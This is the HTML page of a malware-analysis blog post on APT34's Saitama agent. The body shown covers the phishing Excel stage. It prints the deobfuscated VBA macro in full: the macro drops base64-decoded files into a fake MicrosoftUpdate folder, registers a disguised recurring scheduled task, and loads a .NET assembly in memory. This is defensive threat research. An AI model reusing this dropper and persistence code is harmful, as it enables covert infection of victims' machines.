<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>APT34 - Saitama Agent - XJunior</title>
<meta name="description" content="Saitama  abuses the DNS protocol for its C2 communications. This is stealthier than other communication methods. Also  uses techniques such as compression and long random sleep times to disguise malicious traffic in between legitimate traffic.">


  <meta name="author" content="Mohamed Ashraf">
  
  <meta property="article:author" content="Mohamed Ashraf">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="XJunior">
<meta property="og:title" content="APT34 - Saitama Agent">
<meta property="og:url" content="https://x-junior.github.io/malware%20analysis/2022/06/24/Apt34.html">


  <meta property="og:description" content="Saitama  abuses the DNS protocol for its C2 communications. This is stealthier than other communication methods. Also  uses techniques such as compression and long random sleep times to disguise malicious traffic in between legitimate traffic.">



  <meta property="og:image" content="https://x-junior.github.io/assets/Malware-Analysis/Apt34/Saitma.gif">





  <meta property="article:published_time" content="2022-06-24T00:00:00+00:00">





  

  


<link rel="canonical" href="https://x-junior.github.io/malware%20analysis/2022/06/24/Apt34.html">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Mohamed Ashraf",
      "url": "https://x-junior.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="XJunior Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/logo.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/logo.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt="XJunior"></a>
        
        <a class="site-title" href="/">
          XJunior
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/logo5.jpg" alt="Mohamed Ashraf" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Mohamed Ashraf</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis &amp; Reverse Engineering &amp; Cryptography</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
            <li><a href="mailto:malxjunior@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/X__Junior" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/X-Junior" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/x-junior/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://discordapp.com/users/537628178978570261" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-discord" aria-hidden="true"></i><span class="label">Discord</span></a></li>
          
        
          
            <li><a href="https://medium.com/@xjunior" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-medium" aria-hidden="true"></i><span class="label">Medium</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="APT34 - Saitama Agent">
    <meta itemprop="description" content="IntroductionThe spear phishing email contained a malicious attachment  and the malicious attachment droppes APT34 malware named Saitama . What interesting in this sample and set it apart from average malware that it’s using a unique DNS tunneling and stateful programming ( finite state machine ).">
    <meta itemprop="datePublished" content="2022-06-24T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">APT34 - Saitama Agent
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  37 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#introduction">Introduction</a></li><li><a href="#stage-1---excel-document">Stage 1 - Excel Document</a><ul><li><a href="#macro-capabilities">Macro Capabilities</a></li><li><a href="#scheduled-task">Scheduled Task</a></li><li><a href="#macro-states-notifications">Macro States Notifications</a></li><li><a href="#dropped-configuration">Dropped Configuration</a></li></ul></li><li><a href="#stage2-net-malicious-file">Stage2 .net Malicious File</a><ul><li><a href="#mutex">Mutex</a></li><li><a href="#machine-states">Machine States</a></li><li><a href="#configuration">Configuration</a></li><li><a href="#sleepalive">SleepAlive</a></li><li><a href="#sleepsecond">SleepSecond</a></li><li><a href="#makedelay">MakeDelay</a></li><li><a href="#alive-state">Alive State</a></li><li><a href="#python-implementation-of-the-dga">Python Implementation of the DGA</a></li><li><a href="#domain-generation">Domain Generation</a></li><li><a href="#quick-recap">Quick Recap</a></li><li><a href="#mainalive-state">MainAlive State</a></li><li><a href="#receive-state">Receive State</a></li><li><a href="#do-state">Do State</a></li><li><a href="#built-in-commands">Built in Commands</a></li><li><a href="#send-state">Send State</a></li><li><a href="#receive-and-send-state">Receive and Send state</a></li><li><a href="#final-recap">Final Recap</a></li></ul></li><li><a href="#iocs">IOCs</a></li><li><a href="#yara-rules">Yara Rules</a></li></ul>

            </nav>
          </aside>
        
        <h1 id="introduction">Introduction</h1>
<p>The spear phishing email contained a malicious attachment  and the malicious attachment droppes APT34 malware named Saitama . What interesting in this sample and set it apart from average malware that it’s using a unique DNS tunneling and stateful programming ( finite state machine ).</p>

<h1 id="stage-1---excel-document">Stage 1 - Excel Document</h1>

<p>The attached Excel file contains a malicious VBA  macro .
The document has an image that tries to convince the victim to enable a macro.
After enabling the macro, the image is replaced with a one of the Jordan government ministrie’s logo .</p>

<p><a href="/assets/Malware-Analysis/Apt34/0.PNG"><img src="/assets/Malware-Analysis/Apt34/0.PNG" alt="0.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/00.PNG"><img src="/assets/Malware-Analysis/Apt34/00.PNG" alt="00.PNG" /></a></p>

<p>Using olevba to get an overview of what the VBA does and extract the macro. It seems it drops and execute a file.</p>

<p><a href="/assets/Malware-Analysis/Apt34/Capture.PNG"><img src="/assets/Malware-Analysis/Apt34/Capture.PNG" alt="Capture.PNG" /></a></p>

<p>Here is the macro after renaming the variable to make it more readable and easy to understand.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">DispCallFunc</span> <span class="k">Lib</span> <span class="s">"oleaut32.dll"</span> <span class="p">(</span><span class="k">ByVal</span> <span class="n">pv</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">ov</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">cc</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">vr</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">ca</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="k">ByRef</span> <span class="n">pr</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="k">ByRef</span> <span class="n">pg</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="k">ByRef</span> <span class="n">par</span> <span class="ow">As</span> <span class="kt">Variant</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Long</span>
<span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Sub</span> <span class="nf">RtlMoveMemory</span> <span class="k">Lib</span> <span class="s">"kernel32"</span> <span class="p">(</span><span class="n">Dst</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Src</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">BLen</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">)</span>
<span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">VarPtrArray</span> <span class="k">Lib</span> <span class="s">"VBE7"</span> <span class="k">Alias</span> <span class="s">"VarPtr"</span> <span class="p">(</span><span class="k">ByRef</span> <span class="n">Var</span><span class="p">()</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">)</span> <span class="ow">As</span> <span class="n">LongPtr</span>
<span class="k">Dim</span> <span class="nv">random_number</span> <span class="ow">As</span> <span class="kt">String</span>

<span class="cp">#If Win64 Then</span>
<span class="k">Const</span> <span class="nv">LS</span> <span class="ow">As</span> <span class="n">LongPtr</span> <span class="o">=</span> <span class="mi">8</span><span class="o">&amp;</span>
<span class="p">#</span><span class="k">Else</span>
<span class="k">Const</span> <span class="nv">LS</span> <span class="ow">As</span> <span class="n">LongPtr</span> <span class="o">=</span> <span class="mi">4</span><span class="o">&amp;</span>
<span class="cp">#End If</span>

<span class="k">Private</span> <span class="k">Sub</span> <span class="nf">WorkbrootFolderk_Open</span><span class="p">()</span>
    <span class="k">GoTo</span> <span class="n">s1</span>
    <span class="n">Sheets</span><span class="p">(</span><span class="s">"Confirmation Receive Document"</span><span class="p">).</span><span class="n">Visible</span> <span class="o">=</span> <span class="k">True</span>
    <span class="n">Sheets</span><span class="p">(</span><span class="s">"Confirmation Receive Documents"</span><span class="p">).</span><span class="n">Visible</span> <span class="o">=</span> <span class="k">False</span>
    <span class="c1">'Sheets("TeamViewer Licenses").Visible = True</span>
    <span class="c1">'Sheets("TeamViewer License").Visible = False</span>
    <span class="k">Exit</span> <span class="k">Sub</span>
	
<span class="nf">s1</span><span class="p">:</span>
    
    <span class="n">Sheets</span><span class="p">(</span><span class="s">"Confirmation Receive Documents"</span><span class="p">).</span><span class="n">Visible</span> <span class="o">=</span> <span class="k">True</span>
    <span class="n">Sheets</span><span class="p">(</span><span class="s">"Confirmation Receive Document"</span><span class="p">).</span><span class="n">Visible</span> <span class="o">=</span> <span class="k">False</span>
 
    <span class="c1">' Generate 4 digit random rumber</span>
    <span class="n">random_number</span> <span class="o">=</span> <span class="k">CStr</span><span class="p">(</span><span class="n">Int</span><span class="p">((</span><span class="mi">10000</span> <span class="o">*</span> <span class="n">Rnd</span><span class="p">())))</span>
    <span class="n">eNotif</span> <span class="s">"zbabz"</span>
    
    <span class="c1">' Create object file</span>
    <span class="k">Set</span> <span class="n">fs</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)</span>
	
    <span class="c1">' Create the TaskService object.</span>
    <span class="k">Set</span> <span class="n">service</span>  <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"schedule.service"</span><span class="p">)</span>
    <span class="k">Call</span> <span class="n">service</span><span class="p">.</span><span class="n">Connect</span>
    <span class="k">Dim</span> <span class="nv">rootFolder</span>
    <span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span>
    
    <span class="c1">' Get the task folder that contains the tasks. </span>
    <span class="k">Set</span> <span class="n">rootFolder</span> <span class="o">=</span> <span class="n">service</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s">"\"</span><span class="p">)</span>
    <span class="n">eNotif</span> <span class="s">"zbbbz"</span> 
  
    <span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span>
	
    <span class="c1">' If mouse device is connected </span>
    <span class="k">If</span> <span class="n">Application</span><span class="p">.</span><span class="n">MouseAvailable</span> <span class="k">Then</span>
        <span class="n">drop_path</span> <span class="o">=</span> <span class="n">LCase</span><span class="p">(</span><span class="n">Environ</span><span class="p">(</span><span class="s">"localappdata"</span><span class="p">))</span> <span class="o">&amp;</span> <span class="s">"\MicrosoftUpdate\"</span>
        <span class="k">If</span> <span class="n">Dir</span><span class="p">(</span><span class="n">drop_path</span><span class="p">,</span> <span class="n">vbDirectory</span><span class="p">)</span> <span class="o">=</span> <span class="s">""</span> <span class="k">Then</span>
            <span class="n">MkDir</span> <span class="n">drop_path</span>
        <span class="k">End</span> <span class="k">If</span>
		
	<span class="c1">' drop_path = \AppData\Local\MicrosoftUpdate\  </span>
	<span class="c1">' drop  following files in drop_path </span>

        <span class="n">malware</span> <span class="o">=</span> <span class="n">drop_path</span> <span class="o">&amp;</span> <span class="s">"update.exe"</span>  
        <span class="n">config</span> <span class="o">=</span> <span class="n">drop_path</span> <span class="o">&amp;</span> <span class="s">"update.exe.config"</span>
        <span class="n">DLL</span> <span class="o">=</span> <span class="n">drop_path</span> <span class="o">&amp;</span> <span class="s">"Microsoft.Exchange.WebServices.dll"</span>
        
	<span class="k">Set</span> <span class="n">objXMLDoc</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Microsoft.XMLDOM"</span><span class="p">)</span>
		
        <span class="k">Set</span> <span class="n">objXmlNode</span>  <span class="o">=</span> <span class="n">objXMLDoc</span><span class="p">.</span><span class="n">createElement</span><span class="p">(</span><span class="s">"tmp"</span><span class="p">)</span>
        <span class="n">objXmlNode</span><span class="p">.</span><span class="n">DataType</span> <span class="o">=</span> <span class="s">"bin.base64"</span>
        <span class="n">objXmlNode</span><span class="p">.</span><span class="n">Text</span> <span class="o">=</span> <span class="n">UserForm1</span><span class="p">.</span><span class="n">Label1</span><span class="p">.</span><span class="n">Caption</span>
        <span class="n">b64_decoded</span>  <span class="o">=</span> <span class="n">objXmlNode</span><span class="p">.</span><span class="n">NodeTypedValue</span>
		
        <span class="k">Dim</span> <span class="nv">FileNumber</span>  <span class="ow">As</span> <span class="kt">Integer</span>
        <span class="n">FileNumber</span>  <span class="o">=</span> <span class="n">FreeFile</span>
        <span class="n">Open</span> <span class="n">malware</span> <span class="k">For</span> <span class="n">Binary</span> <span class="n">Lock</span> <span class="n">Read</span> <span class="n">Write</span> <span class="ow">As</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="k">Dim</span> <span class="nv">Decoded_bytes</span><span class="p">()</span> <span class="ow">As</span> <span class="kt">Byte</span>
        <span class="n">Decoded_bytes</span> <span class="o">=</span> <span class="n">b64_decoded</span> 
        <span class="n">Put</span> <span class="p">#</span><span class="n">FileNumber</span> <span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Decoded_bytes</span>
        <span class="n">Close</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="n">eNotif</span> <span class="s">"zbaez"</span> 

        <span class="n">objXmlNode</span><span class="p">.</span><span class="n">Text</span> <span class="o">=</span> <span class="n">UserForm2</span><span class="p">.</span><span class="n">Label1</span><span class="p">.</span><span class="n">Caption</span>
        <span class="n">b64_decoded</span>  <span class="o">=</span> <span class="n">objXmlNode</span><span class="p">.</span><span class="n">NodeTypedValue</span>
        <span class="n">FileNumber</span>  <span class="o">=</span> <span class="mi">0</span>
        <span class="n">FileNumber</span>  <span class="o">=</span> <span class="n">FreeFile</span>
        <span class="n">Open</span> <span class="n">config</span> <span class="k">For</span> <span class="n">Binary</span> <span class="n">Lock</span> <span class="n">Read</span> <span class="n">Write</span> <span class="ow">As</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="n">Decoded_bytes</span> <span class="o">=</span> <span class="n">b64_decoded</span> 
        <span class="n">Put</span> <span class="p">#</span><span class="n">FileNumber</span> <span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Decoded_bytes</span>
        <span class="n">Close</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="n">eNotif</span> <span class="s">"zbbez"</span>
        
        
        <span class="n">objXmlNode</span><span class="p">.</span><span class="n">Text</span> <span class="o">=</span> <span class="n">UserForm3</span><span class="p">.</span><span class="n">Label1</span><span class="p">.</span><span class="n">Caption</span>
        <span class="n">b64_decoded</span>  <span class="o">=</span> <span class="n">objXmlNode</span><span class="p">.</span><span class="n">NodeTypedValue</span>
        <span class="n">FileNumber</span>  <span class="o">=</span> <span class="mi">0</span>
        <span class="n">FileNumber</span>  <span class="o">=</span> <span class="n">FreeFile</span>
        <span class="n">Open</span> <span class="n">DLL</span> <span class="k">For</span> <span class="n">Binary</span> <span class="n">Lock</span> <span class="n">Read</span> <span class="n">Write</span> <span class="ow">As</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="n">Decoded_bytes</span> <span class="o">=</span> <span class="n">b64_decoded</span> 
        <span class="n">Put</span> <span class="p">#</span><span class="n">FileNumber</span> <span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Decoded_bytes</span>
        <span class="n">Close</span> <span class="p">#</span><span class="n">FileNumber</span> 
        <span class="n">eNotif</span> <span class="s">"zbcez"</span>
		
	<span class="c1">' Create object file</span>
        <span class="k">Set</span> <span class="n">objFSO</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)</span>
        <span class="k">If</span> <span class="k">Not</span> <span class="n">objFSO</span><span class="p">.</span><span class="n">FileExists</span><span class="p">(</span><span class="n">malware</span><span class="p">)</span> <span class="k">Then</span>
            <span class="n">eNotif</span> <span class="s">"zbdez"</span>
           <span class="n">Test</span>
           <span class="n">eNotif</span> <span class="s">"zbeez"</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">End</span> <span class="k">If</span>
 

    <span class="n">eNotif</span> <span class="s">"zbafz"</span>
    <span class="k">Dim</span> <span class="nv">xmlText</span> <span class="ow">As</span> <span class="kt">String</span>
    <span class="n">xmlText</span> <span class="o">=</span> <span class="s">"&lt;?xml version=</span><span class="se">""</span><span class="s">1.0</span><span class="se">""</span><span class="s"> encoding=</span><span class="se">""</span><span class="s">UTF-16</span><span class="se">""</span><span class="s">?&gt;&lt;Task version=</span><span class="se">""</span><span class="s">1.2</span><span class="se">""</span><span class="s"> xmlns=</span><span class="se">""</span><span class="s">http://schemas.microsoft.com/windows/2004/02/mit/task</span><span class="se">""</span><span class="s">&gt;&lt;RegistrationInfo&gt;&lt;Author&gt;Microsoft Corporation&lt;/Author&gt;&lt;Description&gt;Microsoft Important Update&lt;/Description&gt;&lt;/RegistrationInfo&gt;&lt;Triggers&gt;&lt;TimeTrigger&gt;&lt;Repetition&gt;&lt;Interval&gt;PT4M&lt;/Interval&gt;&lt;/Repetition&gt;&lt;StartBoundary&gt;"</span> <span class="o">&amp;</span> <span class="n">Format</span><span class="p">(</span><span class="n">DateAdd</span><span class="p">(</span><span class="s">"n"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Now</span><span class="p">()),</span> <span class="s">"yyyy-mm-ddThh:nn:ss"</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"&lt;/StartBoundary&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/TimeTrigger&gt;&lt;/Triggers&gt;&lt;Principals&gt;&lt;Principal id=</span><span class="se">""</span><span class="s">Author</span><span class="se">""</span><span class="s">&gt;&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;&lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;&lt;/Principal&gt;&lt;/Principals&gt;&lt;Settings&gt;&lt;MultipleInstancesPolicy&gt;Parallel&lt;/MultipleInstancesPolicy&gt;&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;&lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;&lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;&lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;"</span>
    <span class="n">xmlText</span> <span class="o">=</span> <span class="n">xmlText</span> <span class="o">&amp;</span> <span class="s">"&lt;IdleSettings&gt;&lt;Duration&gt;PT10M&lt;/Duration&gt;&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;&lt;/IdleSettings&gt;&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Hidden&gt;false&lt;/Hidden&gt;&lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;&lt;WakeToRun&gt;false&lt;/WakeToRun&gt;&lt;ExecutionTimeLimit&gt;P20D&lt;/ExecutionTimeLimit&gt;&lt;Priority&gt;7&lt;/Priority&gt;&lt;/Settings&gt;&lt;Actions Context=</span><span class="se">""</span><span class="s">Author</span><span class="se">""</span><span class="s">&gt;&lt;Exec&gt;&lt;Command&gt;</span><span class="se">""</span><span class="s">"</span> <span class="o">&amp;</span> <span class="n">ofp</span> <span class="o">&amp;</span> <span class="s">"</span><span class="se">""</span><span class="s">&lt;/Command&gt;&lt;WorkingDirectory&gt;"</span> <span class="o">&amp;</span> <span class="n">drop_path</span> <span class="o">&amp;</span> <span class="s">"&lt;/WorkingDirectory&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;"</span>
                                        
    <span class="c1">' Paramters: 6 =&gt;TASK_CREATE_OR_UPDATE , 3=&gt; TASK_LOGON_INTERACTIVE_TOKEN)</span>
    <span class="k">Call</span> <span class="n">rootFolder</span><span class="p">.</span><span class="n">RegisterTask</span><span class="p">(</span><span class="s">"MicrosoftUpdate"</span><span class="p">,</span> <span class="n">xmlText</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="n">eNotif</span> <span class="s">"zbbfz"</span>
 
<span class="k">End</span> <span class="k">Sub</span>



<span class="k">Sub</span> <span class="nf">Test</span><span class="p">()</span>
    <span class="k">Set</span> <span class="n">objXMLDoc</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Microsoft.XMLDOM"</span><span class="p">)</span>
    <span class="k">Set</span> <span class="n">objXmlNode</span> <span class="o">=</span> <span class="n">objXMLDoc</span><span class="p">.</span><span class="n">createElement</span><span class="p">(</span><span class="s">"tmp"</span><span class="p">)</span>
    <span class="n">objXmlNode</span><span class="p">.</span><span class="n">DataType</span> <span class="o">=</span> <span class="s">"bin.base64"</span>
    <span class="n">objXmlNode</span><span class="p">.</span><span class="n">Text</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">Label</span><span class="p">.</span><span class="n">Caption</span>
    <span class="n">b64_decoded</span>  <span class="o">=</span> <span class="n">objXmlNode</span><span class="p">.</span><span class="n">NodeTypedValue</span>
    
    <span class="k">Dim</span> <span class="nv">decoded_bytes</span><span class="p">()</span> <span class="ow">As</span> <span class="kt">Byte</span>
    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">b64_decoded</span>
    
    
    <span class="c1">' VBA code for calling AppDomain.Load using raw vtable lookups for the IUnknown</span>
    <span class="c1">' Upon searching the next line , the following link pop ups https://gist.github.com/monoxgas/1b36031c5593ebfed3229f4424f77090</span>
    <span class="k">Dim</span> <span class="nv">host</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">mscoree</span><span class="p">.</span><span class="n">CorRuntimeHost</span><span class="p">,</span> <span class="n">dom</span> <span class="ow">As</span> <span class="n">AppDomain</span>
    <span class="n">host</span><span class="p">.</span><span class="n">Start</span>
    <span class="n">host</span><span class="p">.</span><span class="n">GetDefaultDomain</span> <span class="n">dom</span>

    <span class="k">Dim</span> <span class="nv">vRet</span> <span class="ow">As</span> <span class="kt">Variant</span><span class="p">,</span> <span class="n">lRet</span> <span class="ow">As</span> <span class="kt">Long</span>
    <span class="k">Dim</span> <span class="nv">vTypes</span><span class="p">(</span><span class="mi">0</span> <span class="k">To</span> <span class="mi">1</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Integer</span>
    <span class="k">Dim</span> <span class="nv">vValues</span><span class="p">(</span><span class="mi">0</span> <span class="k">To</span> <span class="mi">1</span><span class="p">)</span> <span class="ow">As</span> <span class="n">LongPtr</span>

    <span class="k">Dim</span> <span class="nv">pPArry</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">:</span> <span class="n">pPArry</span> <span class="o">=</span> <span class="n">VarPtrArray</span><span class="p">(</span><span class="n">decoded_bytes</span><span class="p">)</span>
    <span class="k">Dim</span> <span class="nv">pArry</span> <span class="ow">As</span> <span class="n">LongPtr</span>
    <span class="n">RtlMoveMemory</span> <span class="n">pArry</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">pPArry</span><span class="p">,</span> <span class="n">LS</span>
    <span class="k">Dim</span> <span class="nv">vWrap</span><span class="p">:</span> <span class="n">vWrap</span> <span class="o">=</span> <span class="n">pArry</span>
    
    <span class="n">vValues</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="n">VarPtr</span><span class="p">(</span><span class="n">vWrap</span><span class="p">)</span>
    <span class="n">vTypes</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mi">16411</span>
    
    <span class="k">Dim</span> <span class="nv">pRef</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">:</span> <span class="n">pRef</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">Dim</span> <span class="nv">vWrap2</span><span class="p">:</span> <span class="n">vWrap2</span> <span class="o">=</span> <span class="n">VarPtr</span><span class="p">(</span><span class="n">pRef</span><span class="p">)</span>
    
    <span class="n">vValues</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">VarPtr</span><span class="p">(</span><span class="n">vWrap2</span><span class="p">)</span>
    <span class="n">vTypes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">16396</span>
    
    <span class="n">lRet</span> <span class="o">=</span> <span class="n">DispCallFunc</span><span class="p">(</span><span class="n">ObjPtr</span><span class="p">(</span><span class="n">dom</span><span class="p">),</span> <span class="mi">45</span> <span class="o">*</span> <span class="n">LS</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">vbLong</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">vTypes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">vValues</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">vRet</span><span class="p">)</span>
    
    <span class="k">Dim</span> <span class="nv">aRef</span> <span class="ow">As</span> <span class="n">mscorlib</span><span class="p">.</span><span class="n">assembly</span>
    <span class="n">RtlMoveMemory</span> <span class="n">aRef</span><span class="p">,</span> <span class="n">pRef</span><span class="p">,</span> <span class="n">LS</span>
    <span class="n">aRef</span><span class="p">.</span><span class="n">CreateInstance</span> <span class="s">"Saitama.Agent.Program"</span>
    
<span class="k">End</span> <span class="k">Sub</span>

